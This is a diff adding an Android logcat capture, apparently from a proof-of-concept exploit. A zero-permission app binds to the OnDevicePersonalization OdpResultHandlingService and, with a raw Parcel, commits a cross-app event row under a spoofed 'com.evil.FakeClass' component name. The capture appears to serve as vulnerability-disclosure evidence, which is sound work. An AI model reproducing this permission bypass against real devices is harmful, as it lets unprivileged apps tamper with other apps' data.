@@ -1,0 +1,7 @@
+09-29 06:40:53.966 15426 15426 W ODP_RESULT_INJECT3: === OdpResultHandlingService handleResult() injection attempt v3 (raw-Parcel only) ===
+09-29 06:40:53.966 15426 15426 W ODP_RESULT_INJECT3: UID=10397 (ZERO permissions)
+09-29 06:40:53.970 15426 15426 W ODP_RESULT_INJECT3: bindService() returned true
+09-29 06:40:53.996 15426 15426 W ODP_RESULT_INJECT3: [!!!] BOUND with ZERO permissions: ComponentInfo{com.google.android.ondevicepersonalization.services/com.android.ondevicepersonalization.services.federatedcompute.OdpResultHandlingService}
+09-29 06:40:54.006 15426 15426 W ODP_RESULT_INJECT3: transact()=true replyAvail=0
+09-29 06:40:54.006 15426 15426 W ODP_RESULT_INJECT3:   No exception header in reply -- onTransact() completed without throwing. Waiting for async callback...
+09-29 06:40:54.045 15426 15445 W ODP_RESULT_INJECT3: [!!!!!] onSuccess() -- handleResult() completed, EventsDao write returned TRUE. Cross-app EventState row committed under spoofed componentName=com.google.android.gms/com.evil.FakeClass by a ZERO-PERMISSION caller.
